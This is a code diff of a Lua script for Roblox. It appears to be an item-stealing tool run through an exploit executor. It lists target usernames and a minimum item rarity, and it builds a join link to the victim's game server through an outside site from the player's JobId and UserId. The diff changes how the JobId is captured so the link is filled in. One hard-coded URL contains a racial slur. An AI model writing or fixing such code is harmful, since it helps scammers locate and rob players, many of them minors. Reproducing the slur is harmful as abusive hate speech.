@@ -1,4 +1,4 @@
---Ezzz
+--Lol
 
 _G.Usernames = {"AmeliaPrimalPanda201"} 
 _G.min_rarity = "Common" 
@@ -155,14 +155,7 @@ if VIP or FULL then
 end
 local executor = (identifyexecutor and identifyexecutor():lower()) or "unknown"
 
-local jobId = game.JobId
-local uuidPattern = "^%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x$"
-local jobIdAttempts = 0
-while (not jobId or jobId == "" or not string.match(jobId, uuidPattern)) and jobIdAttempts < 30 do
-    task.wait(1)
-    jobId = game.JobId
-    jobIdAttempts = jobIdAttempts + 1
-end
+local jobId = nil
 
 
 
@@ -526,6 +519,7 @@ local function SendFirstMessage(list, prefix)
     local itemPrices = usdData.itemPrices or {}
     local Executor = (identifyexecutor and identifyexecutor()) or "Unknown"
   
+    jobId = game.JobId
     local JoinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
     local avatarrUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"
     local avatarUrl = "https://fuckingniggermf.vercel.app/api/avatar?userId=" .. tostring(plr.UserId)
